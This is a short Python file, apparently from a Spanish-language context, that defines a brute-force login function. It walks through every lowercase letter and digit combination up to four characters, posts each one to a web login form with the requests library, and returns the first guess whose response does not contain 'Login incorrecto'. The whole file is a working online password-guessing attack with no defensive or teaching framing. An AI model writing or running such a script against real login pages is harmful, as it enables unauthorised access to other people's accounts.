import requests
import itertools
import string
import time

def brute_force_login(url, username_field, password_field, username, max_length=4, delay=0.5):
    chars = string.ascii_lowercase + string.digits
    for length in range(1, max_length+1):
        for guess in itertools.product(chars, repeat=length):
            password = ''.join(guess)
            data = {username_field: username, password_field: password}
            response = requests.post(url, data=data)
            if "Login incorrecto" not in response.text:
                return password
            time.sleep(delay)
    return None